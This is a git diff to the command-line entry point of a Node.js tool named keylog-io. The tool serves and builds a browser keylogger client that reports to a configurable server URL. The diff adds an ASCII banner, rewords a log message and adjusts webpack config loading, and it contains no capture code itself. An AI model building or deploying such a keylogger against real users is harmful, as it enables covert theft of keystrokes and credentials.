@@ -9,6 +9,17 @@ const {
   description
 } = require('../package.json');
 
+console.log(String.raw`
+  _              _                 _
+ | |            | |               (_)
+ | | _____ _   _| | ___   __ _     _  ___
+ | |/ / _ \ | | | |/ _ \ / _  |   | |/ _ \
+ |   <  __/ |_| | | (_) | (_| | _ | | (_) |
+ |_|\_\___|\__, |_|\___/ \__, |(_)|_|\___/
+            __/ |         __/ |
+           |___/         |___/  v${version}
+`);
+
 program
   .name('keylog-io')
   .version(version)
@@ -23,7 +34,7 @@ program
   .option('-c, --client', 'Serve the client keylogger file')
   .option('-d, --demo', 'Serve the demo client page')
   .action(options => {
-    console.log('Starting the keylogger server.');
+    console.log('Booting the keylogger server.', '\n');
     keyloggerServer({
       serveDemo: options.demo,
       serveClient: options.client,
@@ -41,14 +52,14 @@ program
     const webpack = require("webpack");
 
     let endpoint = port ? `${hostname}:${port}` : hostname
-    let webpackConfig = require(path.resolve(__dirname, '../webpack.config.js'))
+    let webpackConfig = require(path.resolve(__dirname, '../lib/webpack.config.js'))
 
     // Override default config
     webpackConfig.output.path = path.resolve(options.output)
     webpackConfig.output.filename = 'client.min.js'
-    webpackConfig.plugins[0] = new webpack.DefinePlugin({
+    webpackConfig.plugins.unshift(new webpack.DefinePlugin({
       SERVER_URL: JSON.stringify(endpoint)
-    })
+    }))
 
     console.log('Building client file for:', endpoint, 'endpoint.', '\n');
     webpack(webpackConfig, (err, stats) => {
